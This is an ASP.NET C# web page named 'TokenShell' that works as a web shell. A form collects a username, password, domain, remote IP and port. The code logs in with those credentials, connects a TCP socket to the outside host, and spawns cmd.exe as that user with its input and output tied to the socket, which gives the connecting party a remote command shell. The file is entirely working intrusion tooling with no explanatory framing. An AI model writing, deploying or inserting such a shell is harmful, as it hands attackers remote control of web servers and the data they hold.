<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>

<script runat="server">
    public const int LOGON32_LOGON_INTERACTIVE = 2;
    public const int LOGON32_PROVIDER_DEFAULT = 0;
    public static uint INFINITE = 0xFFFFFFFF;

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool LogonUserA(string lpszUsername, string lpszDomain, string lpszPassword,
                                  int dwLogonType, int dwLogonProvider, out IntPtr phToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool CreateProcessAsUser(IntPtr hToken, string lpApplicationName,
                                           string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
                                           ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles,
                                           uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
                                           ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern Int32 WaitForSingleObject(IntPtr handle, Int32 milliseconds);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr hObject);

    [DllImport("ws2_32.dll", SetLastError = true)]
    static extern IntPtr WSASocket(int af, int type, int protocol, IntPtr lpProtocolInfo, uint g, uint dwFlags);

    [DllImport("ws2_32.dll", SetLastError = true)]
    static extern int connect(IntPtr s, byte[] name, int namelen);

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public uint dwProcessId, dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES {
        public int Length;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    protected void Page_Load(object sender, EventArgs e) { }

    protected void btnConnect_Click(object sender, EventArgs e) {
        string user = txtUser.Text;
        string pass = txtPass.Text;
        string domain = txtDomain.Text;
        string ip = txtIP.Text;
        int port = Convert.ToInt32(txtPort.Text);

        IntPtr token;
        bool success = LogonUserA(user, domain, pass, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, out token);
        if (!success) {
            Response.Write("[-] LogonUser failed. Error: " + Marshal.GetLastWin32Error());
            return;
        }

        IntPtr sock = WSASocket(2, 1, 6, IntPtr.Zero, 0, 0); // AF_INET=2, SOCK_STREAM=1, IPPROTO_TCP=6

        byte[] sockaddr = new byte[16];
        sockaddr[0] = 2; // AF_INET
        ushort netPort = (ushort)IPAddress.HostToNetworkOrder((short)port);
        byte[] portBytes = BitConverter.GetBytes(netPort);
        sockaddr[2] = portBytes[0];
        sockaddr[3] = portBytes[1];
        string[] ipParts = ip.Split('.');
        sockaddr[4] = byte.Parse(ipParts[0]);
        sockaddr[5] = byte.Parse(ipParts[1]);
        sockaddr[6] = byte.Parse(ipParts[2]);
        sockaddr[7] = byte.Parse(ipParts[3]);

        if (connect(sock, sockaddr, sockaddr.Length) != 0) {
            Response.Write("[-] Connect failed. Error: " + Marshal.GetLastWin32Error());
            return;
        }

        STARTUPINFO si = new STARTUPINFO();
        si.cb = Marshal.SizeOf(si);
        si.dwFlags = 0x00000100 | 0x00000101; // STARTF_USESTDHANDLES
        si.hStdInput = sock;
        si.hStdOutput = sock;
        si.hStdError = sock;

        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
        sa.Length = Marshal.SizeOf(sa);

        PROCESS_INFORMATION pi;

        string app = Environment.GetEnvironmentVariable("comspec"); // cmd.exe
        bool procSuccess = CreateProcessAsUser(token, null, app, ref sa, ref sa, true, 0, IntPtr.Zero, null, ref si, out pi);
        if (!procSuccess) {
            Response.Write("[-] CreateProcessAsUser failed. Error: " + Marshal.GetLastWin32Error());
            return;
        }

        WaitForSingleObject(pi.hProcess, (int)INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        CloseHandle(token);
    }
</script>

<html>
<head runat="server">
    <title>TokenShell</title>
</head>
<body>
    <form id="form1" runat="server">
        <h2>Token Shell Connector</h2>
        <p>
            Username:<br />
            <asp:TextBox ID="txtUser" runat="server" Width="300px" /><br />
            Password:<br />
            <asp:TextBox ID="txtPass" runat="server" TextMode="Password" Width="300px" /><br />
            Domain:<br />
            <asp:TextBox ID="txtDomain" runat="server" Width="300px" /><br />
            Remote IP:<br />
            <asp:TextBox ID="txtIP" runat="server" Width="300px" /><br />
            Remote Port:<br />
            <asp:TextBox ID="txtPort" runat="server" Width="100px" /><br /><br />
            <asp:Button ID="btnConnect" runat="server" Text="Connect and Spawn" OnClick="btnConnect_Click" />
        </p>
    </form>
</body>
</html>
